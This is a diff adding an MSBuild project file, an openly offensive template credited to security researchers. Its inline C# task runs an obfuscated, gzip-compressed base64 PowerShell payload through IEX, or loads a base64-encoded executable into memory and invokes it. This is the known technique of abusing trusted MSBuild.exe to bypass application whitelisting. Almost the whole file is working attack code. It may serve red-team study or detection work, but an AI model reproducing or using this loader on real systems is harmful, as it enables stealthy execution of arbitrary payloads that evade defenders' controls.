@@ -1,0 +1,89 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+ <!-- Original Author: Pierre-Alexandre Braeken, Twitter: @pabraeken -->
+ <!-- Based on Casey Smith work (https://gist.github.com/subTee/ca477b4d19c885bec05ce238cbad6371), Twitter: @subTee  -->
+ 
+ <!-- To be launched like so: cmd> %WINDIR%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe task1.xml -->
+ <!-- Modified by Mariusz B. / mgeeky. -->
+	
+  <Target Name="MyLittleInlineTaskName">
+   <MyLittleInlineTask />
+  </Target>
+	<UsingTask
+    TaskName="MyLittleInlineTask"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+	<Task>
+	  <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[		
+			using System;
+			using System.IO;
+			using System.Diagnostics;
+			using System.Reflection;
+			using System.Runtime.InteropServices;
+			using System.Collections.ObjectModel;
+			using System.Management.Automation;
+			using System.Management.Automation.Runspaces;
+			using System.Text;
+			using Microsoft.Build.Framework;
+			using Microsoft.Build.Utilities;
+
+			public class MyLittleInlineTask :  Task, ITask {
+				public override bool Execute() {
+
+					// Is your payload a raw EXE file?
+					bool rawExeFile = false;
+
+					if(!rawExeFile) {
+
+						/*
+						 * Specifies whether Powershell payload is Base64 encoded.
+						*/
+						bool payloadBase64Encoded = false;
+
+						/* 
+						 * Here insert your plain multi-line Powershell snippet 
+						 */
+						string payload = @"
+
+$s = New-Object IO.MemoryStream(, [Convert]::FromBase64String('H4sIAMkfcloC/3u/e390cGVxSWquXlBqWk5qcklmfp6eY3Fxam5STmWslZVPfmJKeGZJRkBiUUlmYo5fYm6qhhJUR3hmXkp+ebGeW35RbrGSpkKNgn9pia5faU6ONS9XNDZFer6pxcWJ6alO+RVAs4Mz8ss11D1LFMrzi7KLFdU1rQFOfXYfjwAAAA=='));
+IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
+						
+						";
+
+						Runspace runspace = RunspaceFactory.CreateRunspace();
+						runspace.Open();
+						RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
+						Pipeline pipeline = runspace.CreatePipeline();
+
+						if (!payloadBase64Encoded) {
+							pipeline.Commands.AddScript(payload);
+						}
+						else {
+							string payload2 = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(payload));
+							pipeline.Commands.AddScript(payload2);
+						}
+						pipeline.Invoke();
+						runspace.Close();	
+					}
+					else {
+						/* 
+						 * Here must be placed Base64 encoded raw EXE / PE file.
+						 */
+						string payload = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAA [...]";
+
+						byte[] decoded = System.Convert.FromBase64String(payload);
+						Assembly asm = Assembly.Load(decoded);
+						MethodInfo method = asm.EntryPoint;
+						object ob = asm.CreateInstance(method.Name);
+						method.Invoke(ob, null);
+					}		
+
+					return true;
+				}								 
+			}			
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
